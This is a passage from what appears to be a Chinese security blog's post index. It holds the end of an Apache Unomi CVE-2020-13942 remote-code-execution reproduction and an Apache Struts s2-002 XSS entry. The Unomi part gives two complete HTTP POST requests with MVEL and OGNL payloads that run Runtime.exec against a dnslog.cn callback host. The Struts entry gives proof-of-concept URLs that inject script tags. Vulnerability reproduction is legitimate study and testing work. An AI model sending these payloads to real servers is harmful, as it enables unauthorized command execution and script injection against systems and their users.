+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/1.1</span><br><span class="line">Host: localhost:8181</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 483</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;filters&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;: &quot;sample&quot;,</span><br><span class="line">            &quot;filters&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;condition&quot;: &#123;</span><br><span class="line">                         &quot;parameterValues&quot;: &#123;</span><br><span class="line">                            &quot;test&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;ping 79jk3a.dnslog.cn\&quot;);&quot;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &quot;type&quot;: &quot;profilePropertyCondition&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;sessionId&quot;: &quot;sample&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>通过OGNL表达式执行任意命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/1.1</span><br><span class="line">Host: localhost:8181</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1064</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;personalizations&quot;:[</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;id&quot;:&quot;gender-test&quot;,</span><br><span class="line">      &quot;strategy&quot;:&quot;matching-first&quot;,</span><br><span class="line">      &quot;strategyOptions&quot;:&#123;</span><br><span class="line">        &quot;fallback&quot;:&quot;var2&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;contents&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;filters&quot;:[</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;condition&quot;:&#123;</span><br><span class="line">                &quot;parameterValues&quot;:&#123;</span><br><span class="line">                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)).(#getruntimemethod = #runtimeclass.getDeclaredMethods().&#123;^ #this.name.equals(\&quot;getRuntime\&quot;)&#125;[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().&#123;? #this.name.equals(\&quot;exec\&quot;)&#125;.&#123;? #this.getParameters()[0].getType().getName().equals(\&quot;java.lang.String\&quot;)&#125;.&#123;? #this.getParameters().length &lt; 2&#125;[0]).(#execmethod.invoke(#rtobj,\&quot;ping 79jk3a.dnslog.cn\&quot;))&quot;,</span><br><span class="line">                  &quot;comparisonOperator&quot;:&quot;equals&quot;,</span><br><span class="line">                  &quot;propertyValue&quot;:&quot;male&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;type&quot;:&quot;profilePropertyCondition&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;sessionId&quot;:&quot;sample&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Unomi/Apache%20Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-13942/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Unomi/Apache%20Unomi%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-13942/" data-id="cl5c2qmo2002yy8v110319i9l" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Apache Struts/（CVE-xxxx-xxxx）s2-002" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Struts/%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" class="article-date">
+  <time datetime="2022-07-08T06:25:53.067Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-xxxx-xxxx）s2-002"><a href="#（CVE-xxxx-xxxx）s2-002" class="headerlink" title="（CVE-xxxx-xxxx）s2-002"></a>（CVE-xxxx-xxxx）s2-002</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><pre><code>对于&lt;s：url&gt;和&lt;s：a&gt;标签，可以在构造和呈现标签的结果URL时注入不能正确转义的参数值。以下情况是已知的：
+构造&lt;s：a&gt;结果中包含的参数值可以注入未转义的双引号，从而可以通过转义已渲染的href属性来在生成的HTML中注入代码。
+当includeParams设置为“none”的任何其他值时，&lt;s：url&gt;和&lt;s：a&gt;标签无法转义&lt;script&gt;标签，可以通过使用GET参数调用包含JSP /动作来利用
+</code></pre>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Struts 2.0.0 - Struts 2.0.11</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>http://www.0-sec.org:8080/index.action?&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
+http://www.0-sec.org:8080/index.action?&lt;script&gt;alert(1)&lt;/script&gt;test=hello
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Apache%20Struts/%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Struts/%EF%BC%88CVE-xxxx-xxxx%EF%BC%89s2-002/" data-id="cl5c2qmln002xy8v12wtagd4c" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/90/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/89/">89</a><a class="page-number" href="/page/90/">90</a><span class="page-number current">91</span><a class="page-number" href="/page/92/">92</a><a class="page-number" href="/page/93/">93</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/92/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
